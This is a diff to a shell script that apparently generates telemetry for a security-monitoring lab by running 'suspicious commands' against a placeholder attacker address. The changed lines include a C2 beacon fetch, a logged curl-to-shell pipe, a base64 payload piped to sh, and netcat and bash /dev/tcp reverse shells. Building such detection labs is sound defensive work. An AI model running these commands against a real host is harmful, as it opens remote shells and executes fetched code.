@@ -66,18 +66,19 @@ EOF
 echo "    wrote $PROFILE_SNIPPET (new shells inherit it)."
 
 echo "[*] Executing suspicious commands (targets are non-routable; they fail safely)..."
-# curl C2 beacon
-curl -s --max-time 3 "http://$ATTACKER_IP/beacon" >/dev/null 2>&1 || true
+# curl/wget C2 beacon (http_get prefers curl, falls back to wget on Hardy)
+http_get "http://$ATTACKER_IP/beacon" >/dev/null 2>&1 || true
 logger -p local6.info -t bash "root[$$]: curl -s http://$ATTACKER_IP/beacon | /bin/sh"
 # base64-decoded payload piped to shell
 echo "aWQ=" | base64 -d 2>/dev/null | sh 2>/dev/null || true
-# netcat reverse shell one-liner (connect attempt fails)
-if command -v nc >/dev/null 2>&1; then
-    timeout 3 nc -e /bin/sh "$ATTACKER_IP" 4444 2>/dev/null || true
+# netcat reverse shell one-liner (connect attempt fails; lab_timeout works
+# even where the coreutils "timeout" tool is absent, e.g. Metasploitable)
+if have nc; then
+    lab_timeout 3 nc -e /bin/sh "$ATTACKER_IP" 4444 2>/dev/null || true
     logger -p local6.info -t bash "root[$$]: nc -e /bin/sh $ATTACKER_IP 4444"
 fi
 # bash /dev/tcp reverse shell attempt
-timeout 3 bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/9001 0>&1" 2>/dev/null || true
+lab_timeout 3 bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/9001 0>&1" 2>/dev/null || true
 
 echo "[*] Snapshot of what auditd captured (if present):"
 if command -v ausearch >/dev/null 2>&1; then
